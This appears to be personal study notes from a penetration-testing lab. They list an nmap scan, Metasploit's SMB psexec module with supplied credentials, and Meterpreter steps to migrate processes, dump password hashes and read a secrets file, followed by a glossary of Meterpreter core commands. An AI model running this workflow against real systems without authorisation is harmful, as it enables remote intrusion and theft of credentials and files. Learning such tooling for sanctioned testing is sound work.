Run
      nmap -sN -Pn -A [target IP] 

      msfconsole 
      search exploit/windows/smb/psexec

      use0


      set SMBPass [password]
      set SMBUser [user]
      run
      
      sysinfo


      migrate 772
      hashdump
      

      search -f secrets.txt
Used to locate files      

      cat "path/to/file" 


<b> Core commands </b>

    background: 
               Backgrounds the current session
    sessions: 
             Quickly switch to another session           
    exit: 
         Terminate the Meterpreter session
    guid: 
         Get the session GUID (Globally Unique Identifier)
    help: 
         Displays the help menu
    info: 
         Displays information about a Post module
    irb: 
        Opens an interactive Ruby shell on the current session
    load: 
         Loads one or more Meterpreter extensions
    migrate: 
            Allows you to migrate Meterpreter to another process
    run: 
        Executes a Meterpreter script or Post module


Become accurate with vuln scanning